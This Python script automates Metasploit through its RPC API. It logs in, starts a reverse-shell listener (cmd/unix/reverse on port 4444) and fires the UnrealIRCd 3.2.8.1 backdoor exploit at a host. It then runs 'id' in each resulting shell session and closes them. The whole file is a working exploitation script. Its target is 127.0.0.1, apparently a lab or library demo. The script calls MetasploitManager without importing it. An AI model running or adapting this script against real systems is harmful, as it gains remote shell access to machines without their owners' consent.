#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import logging, coloredlogs

from MetasploitSession import MetasploitSession

logger = logging.getLogger('Metasploit')
coloredlogs.install(level='DEBUG', logger=logger)

def main():
    host = '127.0.0.1'
    username = 'username'
    password = 'password'
    uri = f'http://{host}:55553/api'

    listen_addr = host
    listen_port = 4444
    payload = 'cmd/unix/reverse'
    
    with MetasploitSession(username, password, uri) as session:
        if session._token is None:
            raise Exception('login failed. check credentials')
        with MetasploitManager(session) as mgr:
            opts = {
                'ExitOnSession': False,
                'PAYLOAD': payload,
                'LHOST': listen_addr,
                'LPORT': listen_port
            }
            resp = mgr.exec_module('exploit', 'multi/handler', opts)
            job_id = resp['job_id']

            opts = {
                'RHOST': host,
                'DisablePayloadHandler': True,
                'LHOST': listen_addr,
                'LPORT': listen_port,
                'PAYLOAD': payload
            }
            mgr.exec_module('exploit', 'unix/irc/unreal_ircd_3281_backdoor', opts)
            resp = mgr.list_jobs()
            while 'Exploit:unix/irc/unreal_ircd_3281_backdoor' in resp:
                print('waiting')
                time.sleep(10)
                resp = mgr.list_jobs()
            resp = mgr.stop_job(job_id)

            resp = mgr.list_sessions()
            for pair in resp:
                sess_id = pair[0]
                mgr.write_to_session_shell(sess_id, 'id\n')
                time.sleep(1)
                resp = mgr.read_session_shell(sess_id)
                print(f'we are user: {resp["data"]}')
                print(f'killing session: {sess_id}')
                mgr.stop_session(sess_id)

if __name__ == '__main__':
    main()
